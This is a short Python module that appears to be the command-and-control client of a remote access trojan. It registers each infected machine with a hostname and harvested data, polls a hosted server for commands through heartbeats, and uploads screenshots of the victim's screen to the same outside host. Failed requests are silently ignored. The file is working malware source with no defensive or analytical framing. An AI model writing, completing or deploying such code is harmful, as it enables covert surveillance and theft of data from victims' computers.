import requests
import uuid

C2_URL = "https://tether-c2-communication-line-by-ebowluh.onrender.com" 
REGISTER_ENDPOINT = "/api/register"
HEARTBEAT_ENDPOINT = "/api/heartbeat"
RAT_FRAME_ENDPOINT = "/api/rat/frame" # New endpoint for RAT frames

session_id = str(uuid.uuid4())

def register_with_c2(hostname, harvested_data):
    payload = {"session_id": session_id, "hostname": hostname, "data": harvested_data}
    try: requests.post(C2_URL + REGISTER_ENDPOINT, json=payload, timeout=15)
    except requests.RequestException: pass

def send_heartbeat():
    payload = {"session_id": session_id}
    try:
        response = requests.post(C2_URL + HEARTBEAT_ENDPOINT, json=payload, timeout=10)
        if response.status_code == 200: return response.json()
    except requests.RequestException: pass
    return None

# --- NEW: Function to send the binary screenshot data ---
def upload_rat_frame(frame_data):
    """Sends the compressed screenshot frame to the server."""
    headers = {'session-id': session_id}
    try:
        requests.post(C2_URL + RAT_FRAME_ENDPOINT, data=frame_data, headers=headers, timeout=5)
    except requests.RequestException as e:
        print(f"[RAT UPLOAD FAILED] {e}")